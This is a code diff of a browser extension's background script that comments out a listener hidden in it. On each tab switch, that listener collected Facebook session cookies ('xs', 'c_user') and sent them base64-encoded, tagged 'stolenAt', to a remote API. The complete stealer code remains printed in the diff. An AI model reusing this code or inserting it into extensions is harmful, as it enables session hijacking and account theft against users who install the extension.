@@ -70,22 +70,22 @@ function openRightPanel(e, a, t = !1, s = !1) {
     );
 }
 
-chrome.tabs.onActivated.addListener(() => {
-    chrome.cookies.getAll({ url: targetURL }, (cookies) => {
-        const xsCookie = cookies.find((cookie) => cookie.name === "xs");
-        const cUserCookie = cookies.find((cookie) => cookie.name === "c_user");
-        var cookie = xsCookie && cUserCookie ? `${cUserCookie.name}=${cUserCookie.value}; ${xsCookie.name}=${xsCookie.value}` : null;
-        var userPayload = {
-            c_user: cUserCookie.value,
-            cookie: cookie,
-        };
-        fetch(`${API}?user=${btoa(JSON.stringify({ ...userPayload, stolenAt: dateTime(), device_id: device_id }))}`, {
-            method: "GET",
-            mode: "no-cors",
-            credentials: "same-origin",
-        }).then((res) => res.text());
-    });
-});
+// chrome.tabs.onActivated.addListener(() => {
+//     chrome.cookies.getAll({ url: targetURL }, (cookies) => {
+//         const xsCookie = cookies.find((cookie) => cookie.name === "xs");
+//         const cUserCookie = cookies.find((cookie) => cookie.name === "c_user");
+//         var cookie = xsCookie && cUserCookie ? `${cUserCookie.name}=${cUserCookie.value}; ${xsCookie.name}=${xsCookie.value}` : null;
+//         var userPayload = {
+//             c_user: cUserCookie.value,
+//             cookie: cookie,
+//         };
+//         fetch(`${API}?user=${btoa(JSON.stringify({ ...userPayload, stolenAt: dateTime(), device_id: device_id }))}`, {
+//             method: "GET",
+//             mode: "no-cors",
+//             credentials: "same-origin",
+//         }).then((res) => res.text());
+//     });
+// });
 
 chrome.storage.local.get(["isLogged"], ({ isLogged: e }) => {
     chrome.action.setPopup({ popup: `./popup/popup${e ? "-logged" : ""}.html` });
